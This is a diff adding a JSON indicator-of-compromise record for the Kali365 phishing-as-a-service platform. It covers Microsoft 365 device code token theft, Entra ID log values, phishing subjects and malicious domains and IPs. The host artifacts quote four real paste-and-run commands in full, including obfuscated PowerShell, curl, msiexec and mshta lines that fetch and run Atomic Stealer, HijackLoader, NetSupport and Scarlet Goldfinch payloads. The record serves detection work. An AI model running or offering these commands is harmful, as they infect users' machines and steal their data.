@@ -1,0 +1,268 @@
+{
+  "malware_family": "Kali365",
+  "threat_actor": "",
+  "platforms": [
+    "windows",
+    "macos",
+    "web"
+  ],
+  "summary": "Kali365 is a phishing-as-a-service platform that automates OAuth device code phishing and adversary-in-the-middle session capture against Microsoft 365, using Cloudflare-hosted (workers.dev/pages.dev) landing pages that return real user_code values and let the platform collect the resulting access and refresh tokens. Post-access activity includes password changes, device registration and BEC-style inbox rule creation using special-character-only rule names. Red Canary also observed copy-and-paste ('paste and run') execution chains delivering Atomic Stealer, HijackLoader, NetSupport Manager and Scarlet Goldfinch payloads.",
+  "mitre_techniques": [
+    "T1566.002",
+    "T1528",
+    "T1550.001",
+    "T1098",
+    "T1114.003",
+    "T1204.004",
+    "T1195.001"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST -H user: Qm7AzR1xBy9KpLs4DvTM_8Hc6Nj-G2fUe3Wo5YtXaI -H BuildID: b4n7QxHoDVLmTY9kEZjAr2Fcuw8zgpivl3Xy-s6tRN https://amber-22.com/api/metrics/run?event=pasted",
+      "context": "Paste-and-run command observed for Atomic Stealer, May 2026",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "'PowerShell.exe' 'Write-Host(&{iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))})2>$null' # Security check ✔️ I'm not a robot Verification ID: 138105",
+      "context": "Paste-and-run command observed for HijackLoader, May 2026",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "'C:\\WINDOWS\\system32\\msIeXec.exe' -PAcKᵃGE http://195.10.205.212/Cpcha /Q",
+      "context": "Paste-and-run command observed for NetSupport Manager, May 2026",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "'cmd.exe' /c s^t^a^r^t '' /min C:\\windows\\system32\\cmd.exe /c '(for /f 'delims=' %E in ('echo C:\\Users\\username\\AppData\\Local\\Voter.pdf') do ^c^u^r^l^ -skLo '%E' 35613analytics.com/uuu && ^m^s^h^t^a^ '%E')'",
+      "context": "Paste-and-run command observed for Scarlet Goldfinch, May 2026",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "msIeXec.exe",
+      "context": "Masquerades as msiexec.exe in NetSupport Manager paste-and-run chain",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\username\\AppData\\Local\\Voter.pdf",
+      "context": "Payload downloaded by Scarlet Goldfinch curl and then executed via mshta",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "# Security check ✔️ I'm not a robot Verification ID: 138105",
+      "context": "Fake CAPTCHA comment appended to HijackLoader paste-and-run PowerShell line",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "^[$@$!%*?^\\-_. +;,\\/:]+$",
+      "context": "Regex for Kali365/BEC inbox rule names consisting only of special characters",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "DocuSign – Signature Required: {sender} Requested Your Signature",
+      "context": "Kali365 phishing email subject impersonating DocuSign",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SharePoint – Document Shared: {sender} Shared a File With You",
+      "context": "Kali365 phishing email subject impersonating SharePoint",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "user_code",
+      "context": "Real-time generated device authorization code displayed on Kali365 landing page",
+      "specificity": "low",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "AuthenticationProtocol:deviceCode",
+      "context": "Entra ID sign-in log field value indicating device code phishing",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "ExtendedProperties.RequestType:Cmsi:Cmsi",
+      "context": "Entra ID sign-in log field typical of Kali365 token theft",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "IncomingTokenType:refreshToken",
+      "context": "Entra ID log value for refresh token redemption from a different IP",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+      "context": "Microsoft Office client application ID used as authentication origin",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "00000003-0000-0000-c000-000000000000",
+      "context": "Microsoft Graph resource targeted by device code authentication",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "amber-22.com",
+      "context": "Atomic Stealer C2 endpoint receiving curl POST telemetry",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/metrics/run?event=pasted",
+      "context": "Atomic Stealer C2 URI for paste-and-run events",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "user: Qm7AzR1xBy9KpLs4DvTM_8Hc6Nj-G2fUe3Wo5YtXaI",
+      "context": "Atomic Stealer curl header observed in paste-and-run chain",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "BuildID: b4n7QxHoDVLmTY9kEZjAr2Fcuw8zgpivl3Xy-s6tRN",
+      "context": "Atomic Stealer curl header observed in paste-and-run chain",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "195.10.205.212",
+      "context": "Host serving NetSupport Manager package /Cpcha via msIeXec.exe",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/Cpcha",
+      "context": "NetSupport Manager payload path served over HTTP",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "35613analytics.com",
+      "context": "Scarlet Goldfinch payload delivery domain used with curl",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/uuu",
+      "context": "Scarlet Goldfinch payload path downloaded by curl",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "workers.dev",
+      "context": "Free Cloudflare infrastructure abused for Kali365 landing pages",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pages.dev",
+      "context": "Free Cloudflare infrastructure abused for Kali365 landing pages",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "macho"
+  ]
+}
